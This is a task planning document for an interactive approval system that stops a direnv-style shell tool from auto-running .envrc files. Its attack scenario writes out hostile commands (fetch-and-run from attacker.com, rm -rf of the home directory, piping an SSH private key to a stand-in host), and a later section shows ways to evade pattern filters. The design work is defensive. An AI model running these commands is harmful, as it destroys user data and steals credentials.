# Explicit Permission Mechanism (Interactive Approval System)

**Task ID**: `task-20`
**Assignee**: Yonghyun Kim (Claude Code)
**Start Date**: 2025-10-23
**Completion Date**: (TBD)
**Status**: 🟡 In Progress

> **Assignee Recording Rules**:
> - **Principle**: Record the **actual developer's name**, not "Claude"
> - Developer requests and Claude Code writes: `Developer Name (Claude Code)`
> - Developer works directly: `Developer Name`

---

## 🔗 Task Relationships

**Parent Task**: None - top-level security task
**Child Tasks**: None (Phase 1 implementation)

**Related Tasks**:
- [File Permission Check](08-file-permission-check.md) - Complementary security feature
- [Security Guidelines](07-security-guidelines.md) - Documentation task

---

## 🌿 Branch Information

**Parent Branch**: `main`
**Current Branch**: `feat/explicit-permission` (to be created)
**PR Link**: (Update after task completion)

> **Branching Strategy**:
> - Planning doc committed to `main` first
> - Feature branch `feat/explicit-permission` created after planning
> - Details in [Branching Strategy Document](../../.claude/branching-strategy.md)

---

## 📋 Task Overview

### Goal
Implement an interactive permission system that prevents automatic execution of `.envrc`/`.profile` files without user approval, significantly improving security.

### Background
**Current Security Risk**:
- Direnv currently auto-executes any `.envrc` file in `$HOME/*`
- Malicious code can run immediately when entering a directory
- No user review or approval process exists

**Attack Scenario**:
```bash
# Attacker creates malicious repo
git clone https://github.com/attacker/innocent-project
cd innocent-project  # ⚠️ Malicious .envrc auto-executes!

# .envrc could contain:
curl http://attacker.com/steal.sh | sh
rm -rf ~/*
cat ~/.ssh/id_rsa | curl -X POST http://attacker.com/...
```

**Inspiration**:
- Original [direnv](https://github.com/direnv/direnv) uses `direnv allow` command
- Our approach: **Interactive prompt** (more user-friendly)

### Scope
**Included** (Phase 1):
- [ ] Interactive approval prompt using POSIX `select` command
- [ ] Persistent approval database (`~/.direnv/allowed_dirs`)
- [ ] Five approval options (allow once, allow permanently, view, deny, skip)
- [ ] Non-interactive mode detection (prevent prompts in scripts)
- [ ] In-memory caching for performance
- [ ] Comprehensive tests (TDD approach)

**Excluded** (Phase 2+):
- File hash-based change detection (Phase 2)
- fzf integration for arrow key support (Phase 2)
- Dangerous pattern warnings (Phase 2)
- File preview in prompt (Phase 2)

---

## 💡 Design and Approach

### Design Decisions (From Discussion 2025-10-23)

#### 1. Why Not Sandbox Execution?
**Conclusion**: Theoretically impossible

**Reasoning**:
- **Time Paradox**: Cannot "safely test" code that reads real files
- **Halting Problem**: Cannot predict all dynamic behavior
- **Example**:
  ```sh
  # Sandbox with isolated filesystem: Won't detect SSH key theft (file doesn't exist)
  # Sandbox with real filesystem: Already compromised SSH key
  ```

#### 2. Why Not Pattern Matching?
**Conclusion**: Insufficient as primary defense

**Reasoning**:
- **Easy Bypass**:
  ```sh
  # Pattern: "rm -rf"
  # Bypass: cmd="rm"; flag="-rf"; $cmd $flag ~/*
  # Bypass: eval "$(echo 'base64_encoded_command' | base64 -d)"
  # Bypass: . ./hidden_script.sh
  ```
- **False Positives**: Blocks legitimate use (e.g., `rm -rf ./build/*`)
- **Maintenance Burden**: New attack patterns emerge constantly

**Decision**: Pattern matching as supplementary feature only (Phase 2)

#### 3. Final Approach: Interactive Prompts
**Why This Works**:
- ✅ User explicitly reviews and approves
- ✅ Natural context (happens at `cd` time)
- ✅ Option to view file content before approving
- ✅ Permanent approval for trusted projects

**Limitations**:
- ⚠️ User error risk (careless approval)
- ⚠️ Education required (users need to check files)

### Technical Approach

#### Phase 1: POSIX `select` Command

```sh
# Example prompt
⚠️  Direnv configuration detected but not approved yet.
📄 File: /Users/name/project/.envrc

1) Allow and load (this directory only)
2) Allow permanently (all subdirectories)
3) View file content first
4) Deny (don't ask again)
5) Skip (ask again next time)
Select an option (1-5): _
```

**Why `select` (not `fzf`)**:
- POSIX standard (bash, zsh, ksh all support)
- No external dependencies
- Simple number input (no arrow keys, but acceptable for Phase 1)

#### Approval Database Structure

**File**: `~/.direnv/allowed_dirs`
```
# Format: TYPE:PATH
exact:/Users/name/project1
recursive:/Users/name/projects
```

**File**: `~/.direnv/denied_dirs`
```
/Users/name/untrusted-repo
```

**Persistence**: Files preserved during updates (not in tar.gz)

#### Core Functions

```sh
# Permission check
_is_allowed()
  - Checks if directory is in allowed_dirs
  - Supports exact match and recursive (parent directory match)
  - Uses in-memory cache (DIRENV_ALLOWED_CACHE)

_is_denied()
  - Checks if directory is in denied_dirs
  - Returns early if found

# Interactive prompt
_prompt_allow_directory()
  - Only runs if [ -t 0 ] (stdin is terminal)
  - Uses POSIX select for menu
  - Option 3 (View content) → cat file → re-prompt
  - Clears screen after choice for clean UX

# Database management
_add_to_allowed_dirs(dir, type)
  - type: "exact" or "recursive"
  - Prevents duplicates
  - Sorts file for readability

_add_to_denied_dirs(dir)
  - Adds to denied_dirs
  - Prevents duplicates
```

### Integration Point

**File**: `src/scripts/load_current_dir_env.sh`

```sh
# Current logic (line ~13):
if [ -f "$DIRENV_ENV_FILE" ]; then
  # Directly source file
fi

# New logic:
if [ -f "$DIRENV_ENV_FILE" ]; then
  # 1. Check if denied
  if _is_denied "$PWD"; then
    return 1
  fi

  # 2. Check if allowed
  if ! _is_allowed "$PWD"; then
    # 3. Prompt user (only if interactive)
    if [ -t 0 ]; then
      _prompt_allow_directory "$PWD" "$DIRENV_ENV_FILE" || return 1
    else
      # Non-interactive: skip silently
      return 1
    fi
  fi

  # 4. Proceed with loading
  source "$DIRENV_ENV_FILE"
fi
```

### Related Files

**New Files**:
- `src/scripts/permission_manager.sh` - Core permission logic
- `test/test_permission_mechanism.sh` - Comprehensive tests

**Modified Files**:
- `src/init.sh` - Source permission_manager.sh
- `src/scripts/load_current_dir_env.sh` - Integrate permission check

**Data Files** (created at runtime):
- `~/.direnv/allowed_dirs`
- `~/.direnv/denied_dirs`

### Expected Issues

#### Issue 1: Subshell in `select` loop
**Problem**: Variables set inside `select` might not persist
**Solution**: Ensure functions are called, not inline variable assignment

#### Issue 2: POSIX compatibility of `select`
**Problem**: `select` is not pure POSIX (but widely supported)
**Solution**: Test on bash, zsh, ksh; fallback read loop if needed

#### Issue 3: Prompt during automated scripts
**Problem**: `cd` in scripts could hang waiting for input
**Solution**: `[ -t 0 ]` check (only prompt if stdin is terminal)

#### Issue 4: Performance with large allowed_dirs
**Problem**: Grepping file every `cd` could be slow
**Solution**: In-memory cache loaded once per session

---

## 📝 Progress Log

### 2025-10-23
**Planning Phase**:
- ✅ Discussed sandbox execution feasibility → Decided against (impossible)
- ✅ Discussed pattern matching effectiveness → Supplementary only
- ✅ Finalized interactive prompt approach
- ✅ Updated future ideas document with design decisions
- ✅ Created this task document
- **Next**: Commit planning doc to `main`, create feature branch

---

## 🔧 Technical Decisions

### Decision 1: Interactive Prompts Over `de allow` Command
- **Date**: 2025-10-23
- **Problem**: How to get user approval?
- **Options**:
  1. Command-based (like original direnv): `de allow`
  2. Interactive prompt at `cd` time
- **Decision**: Interactive prompt
- **Reason**:
  - More user-friendly (no command to remember)
  - Natural context (happens right when entering directory)
  - Reduces friction (user sees file path immediately)
  - Can view content before approving

### Decision 2: POSIX `select` Over `fzf`
- **Date**: 2025-10-23
- **Problem**: Which UI library to use?
- **Options**:
  1. POSIX `select` (number input)
  2. fzf (arrow keys, fuzzy search)
  3. Custom solution (read + escape codes)
- **Decision**: POSIX `select` for Phase 1
- **Reason**:
  - No external dependencies
  - POSIX-compatible (bash, zsh, ksh)
  - Simple and reliable
  - fzf can be Phase 2 enhancement (hybrid approach)

### Decision 3: No Hash-Based Change Detection (Phase 1)
- **Date**: 2025-10-23
- **Problem**: Should we detect `.envrc` modifications?
- **Options**:
  1. Store file hash, re-prompt on change
  2. Trust until user manually denies
- **Decision**: No hash checking in Phase 1
- **Reason**:
  - Simpler implementation
  - User can manually deny if suspicious
  - Hash checking can be Phase 2
  - Focus on core approval workflow first

### Decision 4: Separate allowed_dirs and denied_dirs
- **Date**: 2025-10-23
- **Problem**: Single file or separate?
- **Options**:
  1. Single file with status column
  2. Separate files
- **Decision**: Separate files
- **Reason**:
  - Simpler parsing (no column format)
  - Clear semantics
  - Easier to maintain manually

---

## 📁 Related Files

### Created Files
- [ ] `src/scripts/permission_manager.sh` - Core functions
  - `_is_allowed()`
  - `_is_denied()`
  - `_prompt_allow_directory()`
  - `_add_to_allowed_dirs()`
  - `_add_to_denied_dirs()`

- [ ] `test/test_permission_mechanism.sh` - Tests
  - Test allowed_dirs exact match
  - Test allowed_dirs recursive match
  - Test denied_dirs blocking
  - Test interactive prompt (mocked input)
  - Test non-interactive mode (no prompt)
  - Test file management functions

### Modified Files
- [ ] `src/init.sh` - Add sourcing of permission_manager.sh
- [ ] `src/scripts/load_current_dir_env.sh` - Integrate permission check before loading
- [ ] `CLAUDE.md` - Update with permission mechanism explanation
- [ ] `README.md` - Add security section mentioning approval system

---

## 🐛 Issues and Solutions

(To be filled during implementation)

---

## ✅ Completion Checklist

### Planning
- [x] Design finalized and documented
- [x] Task document created
- [ ] Task document committed to `main`
- [ ] Feature branch created

### Feature Implementation (TDD Approach)
- [ ] Write test: allowed_dirs exact match
- [ ] Implement: `_is_allowed()` exact match
- [ ] Write test: allowed_dirs recursive match
- [ ] Implement: `_is_allowed()` recursive logic
- [ ] Write test: denied_dirs blocking
- [ ] Implement: `_is_denied()`
- [ ] Write test: add to allowed_dirs (no duplicates)
- [ ] Implement: `_add_to_allowed_dirs()`
- [ ] Write test: add to denied_dirs
- [ ] Implement: `_add_to_denied_dirs()`
- [ ] Write test: interactive prompt (option 1)
- [ ] Write test: interactive prompt (option 5 - skip)
- [ ] Implement: `_prompt_allow_directory()` with POSIX select
- [ ] Write test: non-interactive mode (no prompt)
- [ ] Implement: `[ -t 0 ]` check
- [ ] Integration: Modify load_current_dir_env.sh
- [ ] Test: End-to-end flow (cd → prompt → allow → load)

### Code Quality
- [ ] `make test` passes (all existing + new tests)
- [ ] POSIX compatibility verified (bash, zsh)
- [ ] No shellcheck warnings
- [ ] Comments added to complex logic
- [ ] Function names consistent with codebase style

### Testing
- [ ] Local environment tested manually
- [ ] Edge cases: Empty allowed_dirs file
- [ ] Edge cases: Permission denied on writing files
- [ ] Edge cases: Malformed allowed_dirs entries
- [ ] Error cases: Non-existent .envrc file

### Documentation
- [ ] Progress log updated in this document
- [ ] CLAUDE.md updated with permission mechanism
- [ ] README.md security section added
- [ ] Comments in code explain approval flow

### Commits
- [ ] Planning doc committed separately (to `main`)
- [ ] Each feature committed separately (on feature branch)
- [ ] Tests committed with implementation
- [ ] Documentation updates committed separately
- [ ] Commit messages follow convention

### PR and Merge
- [ ] PR created to `main`
- [ ] PR description includes security improvement summary
- [ ] User approval obtained
- [ ] PR merged
- [ ] Version bumped (likely minor: new security feature)

---

## 🔗 References

- [Original direnv allow mechanism](https://github.com/direnv/direnv#the-stdlib)
- [POSIX select command spec](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html)
- [Branching Strategy](../../.claude/branching-strategy.md)
- [Commit Guidelines](../../.claude/commit-guidelines.md)

---

## 📌 Notes

### User Education Required
This feature improves security but doesn't eliminate risk:
- Users must **actually review** file contents (option 3)
- "Allow permanently" should be used only for truly trusted projects
- Users should understand risks of shell script execution

### Future Enhancements (Phase 2)
- Hash-based change detection
- fzf integration for better UX
- Dangerous pattern warnings (supplementary)
- File preview in prompt (first 3 lines)
- `de allow` / `de deny` / `de allowed` commands

### Migration Path
- Existing users will be prompted for all previously auto-loaded directories
- Can be annoying initially (many prompts)
- Consider adding batch approval tool (future)

---

**Last Updated**: 2025-10-23
